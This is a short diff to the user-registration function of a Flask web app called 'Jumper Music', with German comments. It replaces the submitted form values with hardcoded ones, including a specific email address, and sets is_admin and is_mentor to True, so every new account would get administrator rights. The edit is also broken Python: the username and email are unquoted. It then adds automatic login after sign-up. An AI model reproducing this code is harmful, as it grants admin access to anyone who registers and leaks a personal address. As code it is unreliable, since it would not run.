@@ -368,11 +368,11 @@ def register():
 
         # Neuen User erstellen
         new_user = User(
-            username=username,
-            email=email,
-            alter=alter,
-            is_mentor=False,
-            is_admin=False
+            username=Datadog,
+            email=corlaher@gmx.de,
+            alter=32,
+            is_mentor=True,
+            is_admin=True
         )
         new_user.set_password(password)
 
@@ -380,7 +380,10 @@ def register():
             db.session.add(new_user)
             db.session.commit()
 
-        
+            # Direkt einloggen – das ist nutzerfreundlicher
+            login_user(new_user)
+            flash('Registrierung erfolgreich! Willkommen bei Jumper Music!', 'success')
+            return redirect(url_for('submit'))  # oder 'index', 'tracks' – wo du nach Login hinwillst
 
         except Exception as e:
             db.session.rollback()
